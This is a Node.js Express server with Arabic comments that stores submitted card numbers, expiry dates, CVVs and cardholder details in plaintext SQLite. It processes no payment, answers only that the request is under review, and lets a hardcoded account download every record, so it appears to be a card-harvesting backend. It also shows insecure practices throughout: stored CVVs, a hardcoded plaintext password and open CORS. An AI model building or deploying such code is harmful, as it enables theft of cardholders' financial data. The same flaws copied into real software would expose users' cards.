const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

// إعداد قاعدة البيانات
const db = new sqlite3.Database('./database.db');

// إنشاء جدول لتخزين بيانات الدفع
db.serialize(() => {
    db.run("CREATE TABLE IF NOT EXISTS payments (name TEXT, card_number TEXT, expiry_date TEXT, cvv TEXT, country TEXT, amount REAL, currency TEXT)");
    db.run("CREATE TABLE IF NOT EXISTS users (user_id TEXT, password TEXT)");
    // إضافة مستخدم اختباري
    const stmt = db.prepare("INSERT INTO users (user_id, password) VALUES (?, ?)");
    stmt.run("hema", "aa.1122334455.aa");  // استبدل user_id و password بالقيم الجديدة
    stmt.finalize();
});

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// تقديم ملفات ثابتة من مجلد 'public'
app.use(express.static(path.join(__dirname, 'public')));

// استقبال البيانات وإدخالها في قاعدة البيانات
app.post('/submit', (req, res) => {
    const { name, card_number, expiry_date, cvv, country, amount, currency } = req.body;
    const stmt = db.prepare("INSERT INTO payments (name, card_number, expiry_date, cvv, country, amount, currency) VALUES (?, ?, ?, ?, ?, ?, ?)");
    stmt.run(name, card_number, expiry_date, cvv, country, amount, currency);
    stmt.finalize();
    res.send('قيد المرجعه الطلب');
});

// عرض البيانات بعد التحقق من المستخدم وكلمة المرور
app.post('/view-data', (req, res) => {
    const { userId, password } = req.body;

    if (!userId || !password) {
        return res.status(400).send('رقم المستخدم وكلمة المرور مطلوبان');
    }

    db.get("SELECT * FROM users WHERE user_id = ? AND password = ?", [userId, password], (err, row) => {
        if (err) {
            console.error('خطأ في قاعدة البيانات:', err.message);
            return res.status(500).send('خطأ في الخادم');
        } else if (row) {
            db.all("SELECT * FROM payments", [], (err, rows) => {
                if (err) {
                    console.error('خطأ في قاعدة البيانات:', err.message);
                    return res.status(500).send('خطأ في الخادم');
                } else {
                    res.json(rows);
                }
            });
        } else {
            res.status(401).send('رقم المستخدم أو كلمة المرور غير صحيحة');
        }
    });
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
